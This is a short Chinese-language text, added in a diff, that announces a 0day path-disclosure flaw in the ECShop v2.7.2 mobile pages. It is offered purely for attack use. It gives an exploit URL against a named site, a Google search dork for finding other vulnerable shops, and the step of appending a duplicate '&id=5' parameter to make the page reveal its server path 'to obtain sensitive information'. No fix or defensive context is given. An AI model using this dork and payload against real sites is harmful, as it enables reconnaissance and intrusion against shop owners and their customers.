@@ -1,0 +1,11 @@
+ECShop v2.7.2 wap页面暴路径漏洞0day ECShop v2.7.2漏洞
+
+漏洞利用链接：
+
+http://www.pahuai.com/mobile/goods.php?act=view_img&id=123&id=5
+
+谷歌：inurl:mobile/goods.php?act=view_img&id=123
+
+搜到后在页面加个&id=5
+
+即可爆出ECShop v2.7.2的路径，获取敏感信息用！
